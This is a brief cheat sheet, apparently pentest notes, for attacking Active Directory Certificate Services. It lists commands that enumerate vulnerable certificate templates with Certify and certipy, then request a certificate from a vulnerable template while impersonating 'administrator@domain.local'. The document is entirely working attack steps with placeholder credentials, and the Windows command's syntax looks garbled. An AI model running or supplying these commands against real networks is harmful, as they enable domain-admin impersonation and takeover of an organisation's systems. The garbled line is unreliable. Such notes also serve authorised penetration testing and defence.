Windows enumerate vulnerable certificates
- `certify.exe find domain.local/user:pass@domain.local -vulnerable`
Linux enumerate vulnerable certificates
- `certipy-ad find -u 'user' -p 'pass' -dc-ip '127.0.0.1' -vulnerable -stdout`
Request vulnerable certificate for admin
- `certipy-ad req -u 'user' -p 'pass' -dc-ip '127.0.0.1' -ca 'DOMAIN-CA' -target 'dc.local' -template 'VULN-TEMPLATE' -upn 'administrator@domain.local' -ns '127.0.0.1'`